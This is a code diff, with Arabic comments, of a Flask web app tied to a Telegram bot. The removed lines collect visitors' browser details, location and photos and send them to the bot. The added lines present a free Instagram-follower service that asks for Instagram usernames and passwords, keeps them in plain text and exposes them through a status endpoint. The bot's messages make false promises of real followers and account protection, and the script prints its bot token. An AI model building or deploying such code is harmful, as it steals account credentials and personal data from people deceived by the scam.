-        # حفظ البيانات
-        filename = f"user_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        filepath = os.path.join('collected_data', filename)
-        
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(user_data, f, ensure_ascii=False, indent=2)
-        
-        # حفظ الصورة إذا وجدت
-        if 'photo' in request.files:
-            photo = request.files['photo']
-            if photo.filename:
-                photo_path = os.path.join('user_data', f"photo_{user_id}.jpg")
-                photo.save(photo_path)
-        
-        # إرسال إشعار للبوت
-        asyncio.run(send_data_to_bot(user_id, user_data))
-        
-        return jsonify({'success': True})
-        
-    except Exception as e:
-        print(f"Error saving data: {e}")
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/select_package', methods=['POST'])
-def select_package():
+@app.route('/start_service', methods=['POST'])
+def start_service():
+    """بدء خدمة زيادة المتابعين"""
     try:
         data = request.get_json()
+        ig_username = data.get('ig_username')
+        ig_password = data.get('ig_password')
+        target_followers = data.get('target_followers', 100)
         user_id = data.get('user_id')
-        package = data.get('package')
         
-        # إرسال إشعار للبوت
-        asyncio.run(send_package_to_bot(user_id, package))
+        if not all([ig_username, ig_password, user_id]):
+            return jsonify({'success': False, 'error': 'Missing required data'})
         
-        return jsonify({'success': True})
+        # إنشاء طلب جديد
+        order_id = f"IG_{random.randint(100000, 999999)}"
         
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-# ========== وظائف التليجرام ==========
-async def send_data_to_bot(user_id, user_data):
-    """إرسال بيانات المستخدم للبوت"""
-    try:
-        application = Application.builder().token(BOT_TOKEN).build()
-        
-        user_id_int = int(user_id)
-        
-        message = f"""
-📊 **تم جمع بيانات جديدة!**
-
-🆔 **المستخدم:** {user_id}
-🌐 **المتصفح:** {user_data.get('userAgent', '')[:50]}...
-📍 **الموقع:** {user_data.get('location', 'غير متاح')}
-🖥️ **الشاشة:** {user_data.get('screen', 'غير معروف')}
-🌍 **المنطقة:** {user_data.get('timezone', 'غير معروف')}
-
-✅ **تم جمع البيانات بنجاح**
-        """
-        
-        await application.bot.send_message(
-            chat_id=user_id_int,
-            text=message,
-            parse_mode='HTML'
-        )
-        
-        print(f"✅ تم إرسال بيانات المستخدم {user_id}")
-        
-    except Exception as e:
-        print(f"❌ خطأ في إرسال البيانات: {e}")
-
-async def send_package_to_bot(user_id, package):
-    """إرسال اختيار الباقة للبوت"""
-    try:
-        application = Application.builder().token(BOT_TOKEN).build()
-        
-        user_id_int = int(user_id)
-        
-        package_names = {
-            'free': '🎁 100 متابع مجاناً',
-            'basic': '⭐ 1000 متابع',
-            'premium': '👑 5000 متابع'
+        order_data = {
+            'order_id': order_id,
+            'user_id': user_id,
+            'ig_username': ig_username,
+            'ig_password': ig_password,
+            'target_followers': target_followers,
+            'status': 'pending',
+            'progress': 0,
+            'current_followers': 0,
+            'created_at': datetime.now().isoformat()
         }
         
-        message = f"""
-🎉 **تم اختيار باقة جديدة!**
+        # بدء الخدمة
+        order_manager.orders[order_id] = order_data
+        order_manager.start_growth_service(order_data)
+        
+        # إرسال إشعار للبوت
+        asyncio.run(send_service_start_notification(user_id, order_id, ig_username))
+        
+        return jsonify({
+            'success': True,
+            'order_id': order_id,
+            'message': 'تم بدء خدمة زيادة المتابعين'
+        })
+        
+    except Exception as e:
+        print(f"Service start error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
 
-📦 **الباقة:** {package_names.get(package, package)}
-🆔 **المستخدم:** {user_id}
+@app.route('/get_service_status')
+def get_service_status():
+    """الحصول على حالة الخدمة"""
+    order_id = request.args.get('order_id')
+    if not order_id:
+        return jsonify({'success': False, 'error': 'No order ID'})
+    
+    order_data = order_manager.orders.get(order_id)
+    if order_data:
+        return jsonify({'success': True, 'order_data': order_data})
+    else:
+        return jsonify({'success': False, 'error': 'Order not found'})
+
+@app.route('/service_status/<user_id>')
+def service_status_page(user_id):
+    """صفحة حالة الخدمة"""
+    return render_template_string(STATUS_HTML, user_id=user_id)
+
+# ========== وظائف التليجرام ==========
+async def send_service_start_notification(user_id, order_id, username):
+    """إرسال إشعار بدء الخدمة للبوت"""
+    try:
+        application = Application.builder().token(BOT_TOKEN).build()
+        
+        user_id_int = int(user_id)
+        
+        message = f"""
+🚀 **تم بدء خدمة زيادة المتابعين!**
+
+👤 **الحساب:** @{username}
+🆔 **رقم الطلب:** {order_id}
 🕒 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+📊 **جاري بدء عملية النمو...**
+• المتابعة من الهاشتاقات
+• المتابعة من الحسابات الكبيرة
+• محاكاة السلوك البشري
+
+⏰ **المدة المتوقعة:** 2-6 ساعات
+🎯 **سيتم إرسال التحديثات تلقائياً**
         """
         
         await application.bot.send_message(
@@ -605,8 +838,10 @@ async def send_package_to_bot(user_id, package):
             parse_mode='HTML'
         )
         
+        print(f"✅ تم إرسال إشعار بدء الخدمة للمستخدم {user_id}")
+        
     except Exception as e:
-        print(f"❌ خطأ في إرسال الباقة: {e}")
+        print(f"❌ خطأ في إرسال إشعار الخدمة: {e}")
 
 class TelegramBot:
     def __init__(self, token):
@@ -618,40 +853,56 @@ class TelegramBot:
         user = update.effective_user
         user_id = user.id
         
-        # حفظ بيانات المستخدم
-        user_data = {
-            'username': user.username,
-            'first_name': user.first_name,
-            'join_date': datetime.now().isoformat()
-        }
-        user_manager.add_user(user_id, user_data)
-        
         # إنشاء رابط المستخدم
-        base_url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:5000')
-        user_url = f"{base_url}/consent/{user_id}"
+        base_url = os.environ.get('RENDER_EXTERNAL_URL', f"https://{request.host}" if request else "http://localhost:5000")
+        user_url = f"{base_url}/user/{user_id}"
         
         welcome_text = f"""
-🎉 **أهلاً بك {user.first_name}!**
+🎉 **أهلاً بك {user.first_name} في خدمة زيادة متابعين إنستغرام الحقيقية!**
 
 📱 **رابطك الخاص:**
 {user_url}
 
-🚀 **كيفية الحصول على المتابعين:**
-1. افتح الرابط أعلاه
-2. وافق على الشروط
-3. انتظر جمع البيانات
-4. اختر الباقة المناسبة
-5. استلم متابعينك!
+⚡ **مميزات الخدمة:**
+✅ متابعين حقيقين ونشطين
+✅ نمو عضوي آمن
+✅ عدم استخدام بوتات
+✅ محاكاة السلوك البشري
+✅ حماية حسابك من الحظر
 
-🎁 **احصل على 100 متابع مجاناً الآن!**
+🔒 **كيفية العمل:**
+1. افتح الرابط أعلاه
+2. أدخل بيانات حساب إنستغرام
+3. اختر عدد المتابعين المطلوب
+4. شاهد المتابعين يزدادون فعلياً!
+
+🚀 **ابدأ الآن وارفع متابعين حسابك!**
         """
         
         await update.message.reply_text(welcome_text, parse_mode='HTML')
-        print(f"🔗 تم إنشاء رابط للمستخدم {user_id}")
+        print(f"🔗 تم إنشاء رابط للمستخدم {user_id}: {user_url}")
+
+    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """أمر /help"""
+        help_text = """
+🤖 **أوامر البوت:**
+
+/start - بدء البوت والحصول على الرابط الخاص
+/help - عرض الرسالة المساعدة
+/status - حالة طلباتك
+
+📞 **الدعم الفني:**
+@your_support_username
+
+🕒 **أوقات العمل:**
+24/7
+        """
+        await update.message.reply_text(help_text)
 
     def setup_handlers(self):
         """إعداد معالجات الأوامر"""
         self.application.add_handler(CommandHandler("start", self.start))
+        self.application.add_handler(CommandHandler("help", self.help_command))
 
     def run_polling(self):
         """تشغيل البوت باستخدام Polling"""
@@ -682,8 +933,9 @@ def run_bot():
     bot.run_polling()
 
 if __name__ == '__main__':
-    print("🚀 بدء تشغيل النظام...")
+    print("🚀 بدء تشغيل خدمة زيادة متابعين إنستغرام...")
     print(f"📊 البورت: {PORT}")
+    print(f"🔑 التوكن: {BOT_TOKEN}")
     
     flask_thread = Thread(target=run_flask, daemon=True)
     bot_thread = Thread(target=run_bot, daemon=True)
